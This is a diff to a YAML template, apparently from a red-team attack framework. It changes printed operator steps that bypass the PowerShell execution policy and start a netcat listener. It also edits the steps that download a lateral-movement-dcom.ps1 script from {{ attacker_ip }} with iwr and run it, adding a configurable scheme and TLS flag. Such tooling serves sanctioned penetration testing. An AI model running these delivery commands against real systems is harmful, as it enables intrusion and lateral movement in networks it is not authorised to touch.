@@ -18,7 +18,7 @@ content: |
   printf '%s\n' 'Preparation 1 (start listener): {{ include('scripts/listener-nc.yaml') }}'; \
   printf '%s\n' 'Without bypass: Open the created file lateral-movement-dcom.ps1 and paste in line by line into powershell'; \
   printf '%s\n' 'Preparation 2 (for save to disk only): powershell -ep bypass'; \
-  printf '%s\n' 'Deliver & save to disk: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-dcom.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-dcom.ps1'; \
-  printf '%s\n' 'Deliver, save to disk & execute: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-dcom.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-dcom.ps1; {{ delivery_path_windows }}\lateral-movement-dcom.ps1'; \
+  printf '%s\n' 'Deliver & save to disk: iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-dcom.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-dcom.ps1'; \
+  printf '%s\n' 'Deliver, save to disk & execute: iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-dcom.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-dcom.ps1; {{ delivery_path_windows }}\lateral-movement-dcom.ps1'; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }}
